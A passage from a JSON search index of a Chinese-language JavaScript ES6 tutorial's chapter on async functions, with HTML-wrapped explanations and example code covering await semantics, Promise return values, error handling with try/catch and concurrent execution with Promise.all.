<p>\u4e0a\u9762\u4ee3\u7801\u7684\u51fd\u6570<code>gen</code>\u53ef\u4ee5\u5199\u6210<code>async</code>\u51fd\u6570\uff0c<code>async</code>\u51fd\u6570\u5c31\u662f\u5c06 Generator \u51fd\u6570\u7684\u661f\u53f7\uff08<code>*</code>\uff09\u66ff\u6362\u6210<code>async</code>\uff0c\u5c06<code>yield</code>\u66ff\u6362\u6210<code>await</code>\uff0c\u4ec5\u6b64\u800c\u5df2\u3002</p> <pre><code>const asyncReadFile = async function () {\n  const f1 = await readFile('/etc/fstab');\n  const f2 = await readFile('/etc/shells');\n  console.log(f1.toString());\n  console.log(f2.toString());\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_2","title":"\u597d\u5904","text":"<p><code>async</code>\u51fd\u6570\u5bf9 Generator \u51fd\u6570\u7684\u6539\u8fdb\uff0c\u4f53\u73b0\u5728\u4ee5\u4e0b\u56db\u70b9\u3002</p> <p>\uff081\uff09\u5185\u7f6e\u6267\u884c\u5668\u3002</p> <p>Generator \u51fd\u6570\u7684\u6267\u884c\u5fc5\u987b\u9760\u6267\u884c\u5668\uff0c\u6240\u4ee5\u624d\u6709\u4e86<code>co</code>\u6a21\u5757\uff0c\u800c<code>async</code>\u51fd\u6570\u81ea\u5e26\u6267\u884c\u5668\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>async</code>\u51fd\u6570\u7684\u6267\u884c\uff0c\u4e0e\u666e\u901a\u51fd\u6570\u4e00\u6a21\u4e00\u6837\uff0c\u53ea\u8981\u4e00\u884c\u3002</p> <pre><code>asyncReadFile();\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u8c03\u7528\u4e86<code>asyncReadFile</code>\u51fd\u6570\uff0c\u7136\u540e\u5b83\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\uff0c\u8f93\u51fa\u6700\u540e\u7ed3\u679c\u3002\u8fd9\u5b8c\u5168\u4e0d\u50cf Generator \u51fd\u6570\uff0c\u9700\u8981\u8c03\u7528<code>next</code>\u65b9\u6cd5\uff0c\u6216\u8005\u7528<code>co</code>\u6a21\u5757\uff0c\u624d\u80fd\u771f\u6b63\u6267\u884c\uff0c\u5f97\u5230\u6700\u540e\u7ed3\u679c\u3002</p> <p>\uff082\uff09\u66f4\u597d\u7684\u8bed\u4e49\u3002</p> <p><code>async</code>\u548c<code>await</code>\uff0c\u8bed\u4e49\u66f4\u6e05\u695a\u3002<code>async</code>\u8868\u793a\u51fd\u6570\u91cc\u6709\u5f02\u6b65\u64cd\u4f5c\uff0c<code>await</code>\u8868\u793a\u7d27\u8ddf\u5728\u540e\u9762\u7684\u8868\u8fbe\u5f0f\u9700\u8981\u7b49\u5f85\u7ed3\u679c\u3002</p> <p>\uff083\uff09\u66f4\u5e7f\u7684\u9002\u7528\u6027\u3002</p> <p><code>co</code>\u6a21\u5757\u7ea6\u5b9a\uff0c<code>yield</code>\u547d\u4ee4\u540e\u9762\u53ea\u80fd\u662f Thunk \u51fd\u6570\u6216 Promise \u5bf9\u8c61\uff0c\u800c<code>async</code>\u51fd\u6570\u7684<code>await</code>\u547d\u4ee4\u540e\u9762\uff0c\u53ef\u4ee5\u662f Promise \u5bf9\u8c61\u548c\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\uff0c\u4f46\u8fd9\u65f6\u4f1a\u81ea\u52a8\u8f6c\u6210\u7acb\u5373 resolved \u7684 Promise \u5bf9\u8c61\uff09\u3002</p> <p>\uff084\uff09\u8fd4\u56de\u503c\u662f Promise\u3002</p> <p><code>async</code>\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f Promise \u5bf9\u8c61\uff0c\u8fd9\u6bd4 Generator \u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f Iterator \u5bf9\u8c61\u65b9\u4fbf\u591a\u4e86\u3002\u4f60\u53ef\u4ee5\u7528<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u4e0b\u4e00\u6b65\u7684\u64cd\u4f5c\u3002</p> <p>\u8fdb\u4e00\u6b65\u8bf4\uff0c<code>async</code>\u51fd\u6570\u5b8c\u5168\u53ef\u4ee5\u770b\u4f5c\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u5305\u88c5\u6210\u7684\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u800c<code>await</code>\u547d\u4ee4\u5c31\u662f\u5185\u90e8<code>then</code>\u547d\u4ee4\u7684\u8bed\u6cd5\u7cd6\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_3","title":"\u7528\u6cd5","text":"<p><code>async</code>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f7f\u7528<code>then</code>\u65b9\u6cd5\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002\u5f53\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\uff0c\u4e00\u65e6\u9047\u5230<code>await</code>\u5c31\u4f1a\u5148\u8fd4\u56de\uff0c\u7b49\u5230\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\uff0c\u518d\u63a5\u7740\u6267\u884c\u51fd\u6570\u4f53\u5185\u540e\u9762\u7684\u8bed\u53e5\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>async function getStock(name){\n  const symbol = await gerStockSymbol(name);\n  const price = await getStockPrice(symbol);\n}\ngetStock('000011').then((result) =&gt; {\n  console.log(result);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u83b7\u53d6\u80a1\u7968\u62a5\u4ef7\u7684\u51fd\u6570\uff0c\u51fd\u6570\u524d\u9762\u7684<code>async</code>\u5173\u952e\u5b57\uff0c\u8868\u660e\u8be5\u51fd\u6570\u5185\u90e8\u6709\u5f02\u6b65\u64cd\u4f5c\u3002\u8c03\u7528\u8be5\u51fd\u6570\u65f6\uff0c\u4f1a\u7acb\u5373\u8fd4\u56de\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6307\u5b9a\u591a\u5c11\u6beb\u79d2\u540e\u8f93\u51fa\u4e00\u4e2a\u503c\u3002</p> <pre><code>function timeout(ms) {\n  return new Promise((resolve) =&gt; {\n    setTimeout(resolve, ms);\n  });\n}\n\nasync function asyncPrint(value, ms) {\n  await timeout(ms);\n  console.log(value);\n}\n\nasyncPrint('hello world', 50);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6307\u5b9a 50 \u6beb\u79d2\u4ee5\u540e\uff0c\u8f93\u51fa<code>hello world</code>\u3002</p> <p>\u7531\u4e8e<code>async</code>\u51fd\u6570\u8fd4\u56de\u7684\u662f Promise \u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f5c\u4e3a<code>await</code>\u547d\u4ee4\u7684\u53c2\u6570\u3002\u6240\u4ee5\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u7684\u5f62\u5f0f\u3002</p> <pre><code>async function timeout(ms) {\n  await new Promise((resolve) =&gt; {\n    setTimeout(resolve, ms);\n  });\n}\n\nasync function asyncPrint(value, ms) {\n  await timeout(ms);\n  console.log(value);\n}\n\nasyncPrint('hello world', 50);\n</code></pre> <p>async \u51fd\u6570\u6709\u591a\u79cd\u4f7f\u7528\u5f62\u5f0f\u3002</p> <pre><code>// \u51fd\u6570\u58f0\u660e\nasync function foo() {}\n\n// \u51fd\u6570\u8868\u8fbe\u5f0f\nconst foo = async function () {};\n\n// \u5bf9\u8c61\u7684\u65b9\u6cd5\nlet obj = { async foo() {} };\nobj.foo().then(...)\n\n// Class \u7684\u65b9\u6cd5\nclass Storage {\n\n  constructor() {\n    this.cachePromise = caches.open('avatars');\n  }\n\n  async getAvatar(name) {\n    const cache = await this.cachePromise;\n    return cache.match(`/avatars/${name}.jpg`);\n  }\n}\n\nconst storage = new Storage();\nstorage.getAvatar('jake').then(\u2026);\n\n// \u7bad\u5934\u51fd\u6570\nconst foo = async () =&gt; {};\n</code></pre>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_4","title":"\u8bed\u6cd5","text":"<p><code>async</code>\u51fd\u6570\u7684\u8bed\u6cd5\u89c4\u5219\u603b\u4f53\u4e0a\u6bd4\u8f83\u7b80\u5355\uff0c\u96be\u70b9\u662f\u9519\u8bef\u5904\u7406\u673a\u5236\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#promise","title":"\u8fd4\u56de Promise \u5bf9\u8c61","text":"<p><code>async</code>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002</p> <p><code>async</code>\u51fd\u6570\u5185\u90e8<code>return</code>\u8bed\u53e5\u8fd4\u56de\u7684\u503c\uff0c\u4f1a\u6210\u4e3a<code>then</code>\u65b9\u6cd5\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u3002</p> <pre><code>async function f() {\n  return 'hello world';\n}\n\nf().then(v =&gt; console.log(v))\n// \"hello world\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>f</code>\u5185\u90e8<code>return</code>\u547d\u4ee4\u8fd4\u56de\u7684\u503c\uff0c\u4f1a\u88ab<code>then</code>\u65b9\u6cd5\u56de\u8c03\u51fd\u6570\u63a5\u6536\u5230\u3002</p> <p><code>async</code>\u51fd\u6570\u5185\u90e8\u629b\u51fa\u9519\u8bef\uff0c\u4f1a\u5bfc\u81f4\u8fd4\u56de\u7684 Promise \u5bf9\u8c61\u53d8\u4e3a<code>reject</code>\u72b6\u6001\u3002\u629b\u51fa\u7684\u9519\u8bef\u5bf9\u8c61\u4f1a\u88ab<code>catch</code>\u65b9\u6cd5\u56de\u8c03\u51fd\u6570\u63a5\u6536\u5230\u3002</p> <pre><code>async function f() {\n  throw new Error('\u51fa\u9519\u4e86');\n}\n\nf().then(\n  v =&gt; console.log(v),\n  e =&gt; console.log(e)\n)\n// Error: \u51fa\u9519\u4e86\n</code></pre>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#promise_1","title":"Promise \u5bf9\u8c61\u7684\u72b6\u6001\u53d8\u5316","text":"<p><code>async</code>\u51fd\u6570\u8fd4\u56de\u7684 Promise \u5bf9\u8c61\uff0c==\u5fc5\u987b\u7b49\u5230\u5185\u90e8\u6240\u6709<code>await</code>\u547d\u4ee4\u540e\u9762\u7684 Promise \u5bf9\u8c61\u6267\u884c\u5b8c\uff0c\u624d\u4f1a\u53d1\u751f\u72b6\u6001\u6539\u53d8\uff0c==\u9664\u975e\u9047\u5230<code>return</code>\u8bed\u53e5\u6216\u8005\u629b\u51fa\u9519\u8bef\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709<code>async</code>\u51fd\u6570\u5185\u90e8\u7684\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u5b8c\uff0c\u624d\u4f1a\u6267\u884c<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>async function getTitle(url) {\n  let response = await fetch(url);\n  let html = await response.text();\n  return html.match(/&lt;title&gt;([\\s\\S]+)&lt;\\/title&gt;/i)[1];\n}\ngetTitle('https://tc39.github.io/ecma262/').then(console.log)\n// \"ECMAScript 2017 Language Specification\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>getTitle</code>\u5185\u90e8\u6709\u4e09\u4e2a\u64cd\u4f5c\uff1a\u6293\u53d6\u7f51\u9875\u3001\u53d6\u51fa\u6587\u672c\u3001\u5339\u914d\u9875\u9762\u6807\u9898\u3002\u53ea\u6709\u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5168\u90e8\u5b8c\u6210\uff0c\u624d\u4f1a\u6267\u884c<code>then</code>\u65b9\u6cd5\u91cc\u9762\u7684<code>console.log</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#await","title":"await \u547d\u4ee4","text":"<p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c<code>await</code>\u547d\u4ee4\u540e\u9762\u662f\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u8fd4\u56de\u8be5\u5bf9\u8c61\u7684\u7ed3\u679c\u3002\u5982\u679c\u4e0d\u662f Promise \u5bf9\u8c61\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u5bf9\u5e94\u7684\u503c\u3002</p> <pre><code>async function f() {\n  // \u7b49\u540c\u4e8e\n  // return 123;\n  return await 123;\n}\n\nf().then(v =&gt; console.log(v))\n// 123\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>await</code>\u547d\u4ee4\u7684\u53c2\u6570\u662f\u6570\u503c<code>123</code>\uff0c\u8fd9\u65f6\u7b49\u540c\u4e8e<code>return 123</code>\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0c<code>await</code>\u547d\u4ee4\u540e\u9762\u662f\u4e00\u4e2a<code>thenable</code>\u5bf9\u8c61\uff08\u5373\u5b9a\u4e49<code>then</code>\u65b9\u6cd5\u7684\u5bf9\u8c61\uff09\uff0c\u90a3\u4e48<code>await</code>\u4f1a\u5c06\u5176\u7b49\u540c\u4e8e Promise \u5bf9\u8c61\u3002</p> <pre><code>class Sleep {\n  constructor(timeout) {\n    this.timeout = timeout;\n  }\n  then(resolve, reject) {\n    const startTime = Date.now();\n    setTimeout(\n      () =&gt; resolve(Date.now() - startTime),\n      this.timeout\n    );\n  }\n}\n\n(async () =&gt; {\n  const sleepTime = await new Sleep(1000);\n  console.log(sleepTime);\n})();\n// 1000\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>await</code>\u547d\u4ee4\u540e\u9762\u662f\u4e00\u4e2a<code>Sleep</code>\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5b9e\u4f8b\u4e0d\u662f Promise \u5bf9\u8c61\uff0c\u4f46\u662f\u56e0\u4e3a\u5b9a\u4e49\u4e86<code>then</code>\u65b9\u6cd5\uff0c<code>await</code>\u4f1a\u5c06\u5176\u89c6\u4e3a<code>Promise</code>\u5904\u7406\u3002</p> <p>\u8fd9\u4e2a\u4f8b\u5b50\u8fd8\u6f14\u793a\u4e86\u5982\u4f55\u5b9e\u73b0\u4f11\u7720\u6548\u679c\u3002JavaScript \u4e00\u76f4\u6ca1\u6709\u4f11\u7720\u7684\u8bed\u6cd5\uff0c\u4f46\u662f\u501f\u52a9<code>await</code>\u547d\u4ee4\u5c31\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u505c\u987f\u6307\u5b9a\u7684\u65f6\u95f4\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e2a\u7b80\u5316\u7684<code>sleep</code>\u5b9e\u73b0\u3002</p> <pre><code>function sleep(interval) {\n  return new Promise(resolve =&gt; {\n    setTimeout(resolve, interval);\n  })\n}\n\n// \u7528\u6cd5\nasync function one2FiveInAsync() {\n  for(let i = 1; i &lt;= 5; i++) {\n    console.log(i);\n    await sleep(1000);\n  }\n}\n\none2FiveInAsync();\n</code></pre> <p><code>await</code>\u547d\u4ee4\u540e\u9762\u7684 Promise \u5bf9\u8c61\u5982\u679c\u53d8\u4e3a<code>reject</code>\u72b6\u6001\uff0c\u5219<code>reject</code>\u7684\u53c2\u6570\u4f1a\u88ab<code>catch</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u63a5\u6536\u5230\u3002</p> <pre><code>async function f() {\n  await Promise.reject('\u51fa\u9519\u4e86');\n}\n\nf()\n.then(v =&gt; console.log(v))\n.catch(e =&gt; console.log(e))\n// \u51fa\u9519\u4e86\n</code></pre> <p>\u6ce8\u610f\uff0c\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>await</code>\u8bed\u53e5\u524d\u9762\u6ca1\u6709<code>return</code>\uff0c\u4f46\u662f<code>reject</code>\u65b9\u6cd5\u7684\u53c2\u6570\u4f9d\u7136\u4f20\u5165\u4e86<code>catch</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u91cc\u5982\u679c\u5728<code>await</code>\u524d\u9762\u52a0\u4e0a<code>return</code>\uff0c\u6548\u679c\u662f\u4e00\u6837\u7684\u3002</p> <p>\u4efb\u4f55\u4e00\u4e2a<code>await</code>\u8bed\u53e5\u540e\u9762\u7684 Promise \u5bf9\u8c61\u53d8\u4e3a<code>reject</code>\u72b6\u6001\uff0c\u90a3\u4e48\u6574\u4e2a<code>async</code>\u51fd\u6570\u90fd\u4f1a\u4e2d\u65ad\u6267\u884c\u3002</p> <pre><code>async function f() {\n  await Promise.reject('\u51fa\u9519\u4e86');\n  await Promise.resolve('hello world'); // \u4e0d\u4f1a\u6267\u884c\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a<code>await</code>\u8bed\u53e5\u662f\u4e0d\u4f1a\u6267\u884c\u7684\uff0c\u56e0\u4e3a\u7b2c\u4e00\u4e2a<code>await</code>\u8bed\u53e5\u72b6\u6001\u53d8\u6210\u4e86<code>reject</code>\u3002</p> <p>\u6709\u65f6\uff0c\u6211\u4eec\u5e0c\u671b\u5373\u4f7f\u524d\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff0c\u4e5f\u4e0d\u8981\u4e2d\u65ad\u540e\u9762\u7684\u5f02\u6b65\u64cd\u4f5c\u3002\u8fd9\u65f6\u53ef\u4ee5\u5c06\u7b2c\u4e00\u4e2a<code>await</code>\u653e\u5728<code>try...catch</code>\u7ed3\u6784\u91cc\u9762\uff0c\u8fd9\u6837\u4e0d\u7ba1\u8fd9\u4e2a\u5f02\u6b65\u64cd\u4f5c\u662f\u5426\u6210\u529f\uff0c\u7b2c\u4e8c\u4e2a<code>await</code>\u90fd\u4f1a\u6267\u884c\u3002</p> <pre><code>async function f() {\n  try {\n    await Promise.reject('\u51fa\u9519\u4e86');\n  } catch(e) {\n  }\n  return await Promise.resolve('hello world');\n}\n\nf()\n.then(v =&gt; console.log(v))\n// hello world\n</code></pre> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f<code>await</code>\u540e\u9762\u7684 Promise \u5bf9\u8c61\u518d\u8ddf\u4e00\u4e2a<code>catch</code>\u65b9\u6cd5\uff0c\u5904\u7406\u524d\u9762\u53ef\u80fd\u51fa\u73b0\u7684\u9519\u8bef\u3002</p> <pre><code>async function f() {\n  await Promise.reject('\u51fa\u9519\u4e86')\n    .catch(e =&gt; console.log(e));\n  return await Promise.resolve('hello world');\n}\n\nf()\n.then(v =&gt; console.log(v))\n// \u51fa\u9519\u4e86\n// hello world\n</code></pre>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_5","title":"\u9519\u8bef\u5904\u7406","text":"<p>\u5982\u679c<code>await</code>\u540e\u9762\u7684\u5f02\u6b65\u64cd\u4f5c\u51fa\u9519\uff0c\u90a3\u4e48\u7b49\u540c\u4e8e<code>async</code>\u51fd\u6570\u8fd4\u56de\u7684 Promise \u5bf9\u8c61\u88ab<code>reject</code>\u3002</p> <pre><code>async function f() {\n  await new Promise(function (resolve, reject) {\n    throw new Error('\u51fa\u9519\u4e86');\n  });\n}\n\nf()\n.then(v =&gt; console.log(v))\n.catch(e =&gt; console.log(e))\n// Error\uff1a\u51fa\u9519\u4e86\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>async</code>\u51fd\u6570<code>f</code>\u6267\u884c\u540e\uff0c<code>await</code>\u540e\u9762\u7684 Promise \u5bf9\u8c61\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61\uff0c\u5bfc\u81f4<code>catch</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u88ab\u8c03\u7528\uff0c\u5b83\u7684\u53c2\u6570\u5c31\u662f\u629b\u51fa\u7684\u9519\u8bef\u5bf9\u8c61\u3002\u5177\u4f53\u7684\u6267\u884c\u673a\u5236\uff0c\u53ef\u4ee5\u53c2\u8003\u540e\u6587\u7684\u201casync \u51fd\u6570\u7684\u5b9e\u73b0\u539f\u7406\u201d\u3002</p> <p>\u9632\u6b62\u51fa\u9519\u7684\u65b9\u6cd5\uff0c\u4e5f\u662f\u5c06\u5176\u653e\u5728<code>try...catch</code>\u4ee3\u7801\u5757\u4e4b\u4e2d\u3002</p> <pre><code>async function f() {\n  try {\n    await new Promise(function (resolve, reject) {\n      throw new Error('\u51fa\u9519\u4e86');\n    });\n  } catch(e) {\n  }\n  return await('hello world');\n}\n</code></pre> <p>\u5982\u679c\u6709\u591a\u4e2a<code>await</code>\u547d\u4ee4\uff0c\u53ef\u4ee5\u7edf\u4e00\u653e\u5728<code>try...catch</code>\u7ed3\u6784\u4e2d\u3002</p> <pre><code>async function main() {\n  try {\n    const val1 = await firstStep();\n    const val2 = await secondStep(val1);\n    const val3 = await thirdStep(val1, val2);\n\n    console.log('Final: ', val3);\n  }\n  catch (err) {\n    console.error(err);\n  }\n}\n</code></pre> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u4f7f\u7528<code>try...catch</code>\u7ed3\u6784\uff0c\u5b9e\u73b0\u591a\u6b21\u91cd\u590d\u5c1d\u8bd5\u3002</p> <pre><code>const superagent = require('superagent');\nconst NUM_RETRIES = 3;\n\nasync function test() {\n  let i;\n  for (i = 0; i &lt; NUM_RETRIES; ++i) {\n    try {\n      await superagent.get('http://google.com/this-throws-an-error');\n      break;\n    } catch(err) {}\n  }\n  console.log(i); // 3\n}\n\ntest();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c<code>await</code>\u64cd\u4f5c\u6210\u529f\uff0c\u5c31\u4f1a\u4f7f\u7528<code>break</code>\u8bed\u53e5\u9000\u51fa\u5faa\u73af\uff1b\u5982\u679c\u5931\u8d25\uff0c\u4f1a\u88ab<code>catch</code>\u8bed\u53e5\u6355\u6349\uff0c\u7136\u540e\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_6","title":"\u4f7f\u7528\u6ce8\u610f\u70b9","text":"<p>\u7b2c\u4e00\u70b9\uff0c\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\uff0c<code>await</code>\u547d\u4ee4\u540e\u9762\u7684<code>Promise</code>\u5bf9\u8c61\uff0c\u8fd0\u884c\u7ed3\u679c\u53ef\u80fd\u662f<code>rejected</code>\uff0c\u6240\u4ee5\u6700\u597d\u628a<code>await</code>\u547d\u4ee4\u653e\u5728<code>try...catch</code>\u4ee3\u7801\u5757\u4e2d\u3002</p> <pre><code>async function myFunction() {\n  try {\n    await somethingThatReturnsAPromise();\n  } catch (err) {\n    console.log(err);\n  }\n}\n\n// \u53e6\u4e00\u79cd\u5199\u6cd5\n\nasync function myFunction() {\n  await somethingThatReturnsAPromise()\n  .catch(function (err) {\n    console.log(err);\n  });\n}\n</code></pre> <p>\u7b2c\u4e8c\u70b9\uff0c\u591a\u4e2a<code>await</code>\u547d\u4ee4\u540e\u9762\u7684\u5f02\u6b65\u64cd\u4f5c\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7ee7\u53d1\u5173\u7cfb\uff0c\u6700\u597d\u8ba9\u5b83\u4eec\u540c\u65f6\u89e6\u53d1\u3002</p> <pre><code>let foo = await getFoo();\nlet bar = await getBar();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getFoo</code>\u548c<code>getBar</code>\u662f\u4e24\u4e2a\u72ec\u7acb\u7684\u5f02\u6b65\u64cd\u4f5c\uff08\u5373\u4e92\u4e0d\u4f9d\u8d56\uff09\uff0c\u88ab\u5199\u6210\u7ee7\u53d1\u5173\u7cfb\u3002\u8fd9\u6837\u6bd4\u8f83\u8017\u65f6\uff0c\u56e0\u4e3a\u53ea\u6709<code>getFoo</code>\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u4f1a\u6267\u884c<code>getBar</code>\uff0c\u5b8c\u5168\u53ef\u4ee5\u8ba9\u5b83\u4eec\u540c\u65f6\u89e6\u53d1\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nlet [foo, bar] = await Promise.all([getFoo(), getBar()]);\n\n// \u5199\u6cd5\u4e8c\nlet fooPromise = getFoo();\nlet barPromise = getBar();\nlet foo = await fooPromise;\nlet bar = await barPromise;\n</code></pre> <p>\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c<code>getFoo</code>\u548c<code>getBar</code>\u90fd\u662f\u540c\u65f6\u89e6\u53d1\uff0c\u8fd9\u6837\u5c31\u4f1a\u7f29\u77ed\u7a0b\u5e8f\u7684\u6267\u884c\u65f6\u95f4\u3002</p> <p>\u7b2c\u4e09\u70b9\uff0c<code>await</code>\u547d\u4ee4\u53ea\u80fd\u7528\u5728<code>async</code>\u51fd\u6570\u4e4b\u4e2d\uff0c\u5982\u679c\u7528\u5728\u666e\u901a\u51fd\u6570\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>async function dbFuc(db) {\n  let docs = [{}, {}, {}];\n\n  // \u62a5\u9519\n  docs.forEach(function (doc) {\n    await db.post(doc);\n  });\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>await</code>\u7528\u5728\u666e\u901a\u51fd\u6570\u4e4b\u4e2d\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u5c06<code>forEach</code>\u65b9\u6cd5\u7684\u53c2\u6570\u6539\u6210<code>async</code>\u51fd\u6570\uff0c\u4e5f\u6709\u95ee\u9898\u3002</p> <pre><code>function dbFuc(db) { //\u8fd9\u91cc\u4e0d\u9700\u8981 async\n  let docs = [{}, {}, {}];\n\n  // \u53ef\u80fd\u5f97\u5230\u9519\u8bef\u7ed3\u679c\n  docs.forEach(async function (doc) {\n    await db.post(doc);\n  });\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u53ef\u80fd\u4e0d\u4f1a\u6b63\u5e38\u5de5\u4f5c\uff0c\u539f\u56e0\u662f\u8fd9\u65f6\u4e09\u4e2a<code>db.post</code>\u64cd\u4f5c\u5c06\u662f\u5e76\u53d1\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u540c\u65f6\u6267\u884c\uff0c\u800c\u4e0d\u662f\u7ee7\u53d1\u6267\u884c\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f\u91c7\u7528<code>for</code>\u5faa\u73af\u3002</p> <pre><code>async function dbFuc(db) {\n  let docs = [{}, {}, {}];\n\n  for (let doc of docs) {\n    await db.post(doc);\n  }\n}\n</code></pre> <p>\u5982\u679c\u786e\u5b9e\u5e0c\u671b\u591a\u4e2a\u8bf7\u6c42\u5e76\u53d1\u6267\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528<code>Promise.all</code>\u65b9\u6cd5\u3002\u5f53\u4e09\u4e2a\u8bf7\u6c42\u90fd\u4f1a<code>resolved</code>\u65f6\uff0c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u6548\u679c\u76f8\u540c\u3002</p> <pre><code>async function dbFuc(db) {\n  let docs = [{}, {}, {}];\n  let promises = docs.map((doc) =&gt; db.post(doc));\n\n  let results = await Promise.all(promises);\n  console.log(results);\n}\n\n// \u6216\u8005\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\n\nasync function dbFuc(db) {\n  let docs = [{}, {}, {}];\n  let promises = docs.map((doc) =&gt; db.post(doc));\n\n  let results = [];\n  for (let promise of promises) {\n    results.push(await promise);\n  }\n  console.log(results);\n}\n</code></pre> <p>\u7b2c\u56db\u70b9\uff0casync \u51fd\u6570\u53ef\u4ee5\u4fdd\u7559\u8fd0\u884c\u5806\u6808\u3002</p> <pre><code>const a = () =&gt; {\n  b().then(() =&gt; c());\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>a</code>\u5185\u90e8\u8fd0\u884c\u4e86\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1<code>b()</code>\u3002\u5f53<code>b()</code>\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u51fd\u6570<code>a()</code>\u4e0d\u4f1a\u4e2d\u65ad\uff0c\u800c\u662f\u7ee7\u7eed\u6267\u884c\u3002\u7b49\u5230<code>b()</code>\u8fd0\u884c\u7ed3\u675f\uff0c\u53ef\u80fd<code>a()</code>\u65e9\u5c31\u8fd0\u884c\u7ed3\u675f\u4e86\uff0c<code>b()</code>\u6240\u5728\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5df2\u7ecf\u6d88\u5931\u4e86\u3002\u5982\u679c<code>b()</code>\u6216<code>c()</code>\u62a5\u9519\uff0c\u9519\u8bef\u5806\u6808\u5c06\u4e0d\u5305\u62ec<code>a()</code>\u3002</p> 